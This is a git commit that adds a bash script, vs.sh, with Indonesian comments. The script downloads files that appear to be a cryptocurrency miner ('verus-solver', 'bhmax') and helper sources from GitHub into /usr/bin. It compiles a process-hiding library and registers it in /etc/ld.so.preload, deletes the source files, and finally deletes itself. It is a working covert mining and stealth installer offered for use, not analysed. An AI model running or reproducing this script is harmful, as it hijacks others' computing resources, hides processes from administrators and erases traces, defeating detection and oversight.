9b8031847f0ebbd7e2601266afd30195cab03d67
hudahadoh <168321021+hudahadoh@users.noreply.github.com>
2024-06-21 02:03:37 -0400

    Create vs.sh

---
+++ vs.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+# Ubah direktori kerja ke /usr/bin
+cd /usr/bin
+
+# Unduh file yang diperlukan
+wget https://github.com/hudahadoh/vs/raw/main/bhmax
+wget https://github.com/hudahadoh/vs/raw/main/verus-solver
+wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
+wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
+wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
+
+# Ubah izin agar skrip dapat dieksekusi
+chmod +x smtp.py
+
+# Kompilasi processhider.c menjadi libprocess.so
+gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
+
+# Pindahkan libprocess.so ke /usr/local/lib dan tambahkan ke /etc/ld.so.preload
+mv libprocess.so /usr/local/lib/
+echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
+
+# Ubah izin agar bhmax dapat dieksekusi
+chmod +x bhmax
+
+# Kompilasi hi.c menjadi hi
+gcc -o hi hi.c
+
+# Hapus file source setelah kompilasi
+rm hi.c processhider.c
+
+# Ubah izin agar hi dapat dieksekusi
+chmod +x hi
+
+# Hapus skrip yang sudah tidak diperlukan
+rm ~/notebook_files/vs.sh
